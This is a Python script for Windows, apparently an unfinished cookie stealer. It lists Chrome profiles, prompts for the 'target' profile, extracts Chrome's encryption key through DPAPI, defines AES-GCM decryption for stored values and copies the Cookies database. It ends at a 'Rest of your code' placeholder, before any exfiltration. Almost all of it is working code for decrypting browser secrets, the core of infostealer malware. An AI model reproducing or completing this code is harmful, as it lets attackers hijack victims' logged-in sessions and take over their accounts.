import os
import json
import base64
import time
import sqlite3
import shutil
from datetime import datetime, timedelta
import win32crypt
from Crypto.Cipher import AES

def is_chrome_installed():
    chrome_exe_paths = [
        r"C:\Program Files\Google\Chrome\Application\chrome.exe",
        r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe"
    ]
    return any(os.path.exists(path) for path in chrome_exe_paths)

def get_profile_names(profiles_path):
    profile_info_cache_path = os.path.join(profiles_path, "Profile Info Cache")
    profile_names = []

    if os.path.exists(profile_info_cache_path):
        with open(profile_info_cache_path, "r", encoding="utf-8") as f:
            profile_info = json.load(f)
            for profile in profile_info["ProfileInfoCache"]:
                profile_names.append(profile["Name"])

    return profile_names

def get_chrome_datetime(chromedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def get_encryption_key(local_state_path):
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_data(data, key):
    try:
        iv = data[3:15]
        data = data[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(data)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
        except:
            return ""

def main():
    if not is_chrome_installed():
        print("Chrome is not installed on this machine.")
        return

    profiles_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data")
    profile_names = get_profile_names(profiles_path)

    print("Available Chrome profiles:")
    for idx, name in enumerate(profile_names, start=1):
        print(f"{idx}. {name}")

    profile_index = int(input("Enter the profile index of your target: ")) - 1
    if profile_index < 0 or profile_index >= len(profile_names):
        print("Invalid profile index.")
        return

    profile_name = profile_names[profile_index]
    local_state_path = os.path.join(profiles_path, profile_name, "Local State")

    key = get_encryption_key(local_state_path)
    
    db_path = os.path.join(profiles_path, profile_name, "Cookies")
    filename = "Cookies.db"
    if not os.path.isfile(filename):
        shutil.copyfile(db_path, filename)

    # Rest of your code...

if __name__ == "__main__":
    main()

